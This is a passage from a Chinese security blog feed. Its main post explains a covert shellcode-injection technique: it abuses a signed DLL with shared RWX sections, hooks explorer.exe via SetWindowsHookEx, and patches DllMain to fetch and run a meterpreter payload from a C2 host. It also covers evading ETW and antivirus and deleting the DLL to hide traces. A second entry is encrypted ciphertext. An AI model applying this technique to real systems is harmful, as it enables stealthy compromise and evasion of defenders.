hinstDLL,  <span class="comment">// handle to DLL module</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD fdwReason,     <span class="comment">// reason for calling function</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpReserved )</span>  <span class="comment">// reserved</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>( fdwReason ) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:&#123;</span><br><span class="line">            <span class="comment">// 1. 加载 ws2_32.dll </span></span><br><span class="line">            <span class="comment">// 2. 获取与socket相关的函数的地址</span></span><br><span class="line">            <span class="comment">// 3. 连接socket, 如果连接失败，返回FALSE </span></span><br><span class="line">            <span class="comment">// 4. 申请内存空间,下载payload</span></span><br><span class="line">            <span class="comment">// 5. 调用 CreateThread 执行payload ，然后返回 TRUE</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;  <span class="comment">// Successful DLL_PROCESS_ATTACH.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要完成这样一段shellcode，我们是需要再创建一个项目，然后编写相关的c或者汇编代码，编译完成之后把相对于的16进制copy到当前的项目中来，这样做一方面比较麻烦，容易出错；另一方面不太灵活，不便于替换c2地址等操作。</p><p><strong>我想要就在当前项目中完成，编译完之后，运行时patch进去，要怎么做呢？</strong></p><p>仔细想一下，当 <code>DllMain</code>回调函数被执行的时候，难道真的任何地址信息都没有提供吗？其实不然。<br>看 <code>DllMain</code> 的第一个参数 <code>hinstDLL</code> 的值其实就是当前被加载模块的基址，有了这个基址，理论上我们就可以访问到当前模块任何地址空间数据。</p><p>那思路有了: 我们可以让进程A向 DLL 相对于 <code>imageBase</code> 固定偏移的地方写入一些必要的函数指针和数据，例如<code>LoadLibraryA</code>，<code>GetProcAddress</code>的函数的地址，以及 c2 的ip 和端口信息，然后 <code>DllMain</code> 被调用的时候会到指定偏移的地方读取这些数据，完成自己的功能，示意图如下：</p><p><img src="https://pic.wonderkun.cc//uploads/note/202204182132688.png" alt=""></p><p>下面实现就比较简单了，首先需要定义一下要向DLL中写入的数据的结构：</p><p><img src="https://pic.wonderkun.cc//uploads/note/202204182137405.png" alt=""></p><p>其中 <code>fn</code> 开头的存储的是对应函数的指针，<code>char</code>数组保存的是一些字符串信息，便于利用这些字符串获取到socket相关的函数的地址。最后 host 和 port 存储的c2的信息，flag是<code>meterpreter</code>第一阶段向第二阶段的传参约定数据。不了解的可以去读一下 <code>meterpreter</code>的源码，这里不再细说他的相关细节。</p><p>接下来将这个结构体初始化，然后放到固定偏移 <code>OFFSET_TO_SHELLCODE</code> 上去：</p><p><img src="https://pic.wonderkun.cc//uploads/note/202204182144848.png" alt=""></p><p>然后开始编写伪造的DllMain，也就是shellcode的主体代码，如下:</p><p>首先读取指定偏移获取之前存储的数据：</p><p><img src="https://pic.wonderkun.cc//uploads/note/202204182158887.png" alt=""></p><p>然后当 <code>DLL_PROCESS_ATTACH</code> 发生时，调用执行相关的操作加载远程的恶意代码：</p><p><img src="https://pic.wonderkun.cc//uploads/note/202204182200356.png" alt=""></p><p>然后将这段代码patch到DllMain的位置：</p><p><img src="https://pic.wonderkun.cc//uploads/note/202204182203333.png" alt=""></p><p><code>ShellCodeEnd</code> 是我定义的一个空的函数，他紧跟在<code>myDllMain</code>后面，主要是为了帮助我们定位出函数<code>myDllMain</code>在文件中的大小。</p><h2 id="patch-hook-procedure-函数防止程序崩溃"><a href="#patch-hook-procedure-函数防止程序崩溃" class="headerlink" title="patch hook procedure 函数防止程序崩溃"></a>patch hook procedure 函数防止程序崩溃</h2><p>只经过上述patch的DLL是可以满足执行恶意代码的功能，但是会引起被注入程序的异常或者崩溃，因为我们是调用 <code>SetWindowsHookEx</code> 设置的消息钩子，我们传入的 <code>hook procedure</code> 也并非一个钩子处理函数，它并不会调用 <code>CallNextHookEx</code> ，就导致被注入的进程无法响应相关的消息，甚至运行异常代码而崩溃，这样会导致获取的session挂掉， 因此这里也需要对 <code>hook procedure</code> 进行代码patch。</p><p><img src="https://pic.wonderkun.cc//uploads/note/202204182211988.png" alt=""></p><p>这里就是使用传统的shellcode的写法，就是获取 PEB ，遍历dll，然后加载 <code>CallNextHookEx</code> 并调用，这里使用了 <code>lazy_import</code> 的宏 <code>LI_FN</code>,他是可以自动展开为shellcode的，不需要自己再写了。</p><h2 id="主程序"><a href="#主程序" class="headerlink" title="主程序"></a>主程序</h2><p>加载相关 RWX-S的模块，解析PE结构，获取相关的地址：</p><p><img src="https://pic.wonderkun.cc//uploads/note/202204182220207.png" alt=""></p><p>设置消息钩子，进行dll注入。</p><p><img src="https://pic.wonderkun.cc//uploads/note/202204182214469.png" alt=""></p><p>我这里sleep了200秒，然后卸载掉钩子，这个时间长度足够 <code>explorer.exe</code> 触发 <code>WH_GETMESSAGE</code> 消息，并上线了。</p><p><img src="https://pic.wonderkun.cc//uploads/note/202204182217607.png" alt=""></p><p>当钩子被卸载之后，<code>KbdEditDllPremium.dll</code> 也会从内存中卸载，此时主程序其实可以直接删掉 <code>KbdEditDllPremium.dll</code>进行彻底的毁尸灭迹。</p><p><img src="https://pic.wonderkun.cc//uploads/note/202204182222967.png" alt=""></p><p>内存里虽然已经没有了 <code>KbdEditDllPremium.dll</code> 模块，但是却依然不影响我们的session交互，因为此时的恶意代码运行在 <code>explorer.exe</code> 申请的堆空间上。</p><p><img src="https://pic.wonderkun.cc//uploads/note/202204182224697.png" alt=""></p><p>这对于入侵痕迹的隐藏是非常有用的一个技巧。</p><h2 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h2><p>最后还需要再补充一下，因为要在此项目中要编译生成shellcode，所以要对一些编译选项就行一些调整，防止生成的代码无法在其他进程空间中运行。</p><p><img src="https://pic.wonderkun.cc//uploads/note/202204190847820.png" alt=""></p><p>运行库选择MT，然后禁用GS保护。</p><p><img src="https://pic.wonderkun.cc//uploads/note/202204190848574.png" alt=""></p><p>代码优化也需要调整一下。</p><p><strong>最后扩展一句：如果无法找到一个已经签名的RWX-S权限的dll，我们甚至可以修改系统的dll添加S权限，然后保存到临时目录，注入完成之后删除掉。</strong></p><p>为了避免安全风险，代码以及有RWX-S权限的签名DLL就不发源文件了，如果感兴趣，可以联系我获取。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;常规的shellcode注入一般是通过&lt;code&gt;VirtualAllocEx&lt;/code&gt;,&lt;code&gt;WriteProcessMemory&lt;/code&gt; 和 &lt;code&gt;CreateRemoteThread&lt;/code&gt; 来实现的，但是这种方式是被安全软件重点监控的，同时微软提供的ETW接口也是可以轻易检测出上述方式进行代码注入的痕迹。本文的核心是讲解怎么利用具备 RWX-S 权限且自身有签名的白DLL进行一种比较隐蔽的shellcode注入，&lt;br&gt;并讲解具体的代码实现以及在写代码实现的过程中遇到的坑。本方法是由文章提出的：&lt;a href=&quot;https://billdemirkapi.me/sharing-is-caring-abusing-shared-sections-for-code-injection/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://billdemirkapi.me/sharing-is-caring-abusing-shared-sections-for-code-injection/&lt;/a&gt; ，详情可以参考此文章。&lt;/p&gt;
&lt;p&gt;我的知识星球开启内测了，用微信扫描下面的小程序就可以免费加入，来和我一起学习安全技术。(在圈子内可以下载到源代码)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://pic.wonderkun.cc//uploads/note/202204272138408.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="binary" scheme="http://blog.wonderkun.cc/tags/binary/"/>
    
      <category term="windows" scheme="http://blog.wonderkun.cc/tags/windows/"/>
    
      <category term="shellcode" scheme="http://blog.wonderkun.cc/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>深入挖掘bash反弹shell背后的密码</title>
    <link href="http://blog.wonderkun.cc/2021/12/10/%E6%B7%B1%E5%85%A5%E6%8C%96%E6%8E%98bash%E5%8F%8D%E5%BC%B9shell%E8%83%8C%E5%90%8E%E7%9A%84%E7%A7%98%E5%AF%86/"/>
    <id>http://blog.wonderkun.cc/2021/12/10/深入挖掘bash反弹shell背后的秘密/</id>
    <published>2021-12-10T08:16:34.000Z</published>
    <updated>2024-11-18T11:46:14.722Z</updated>
    
    <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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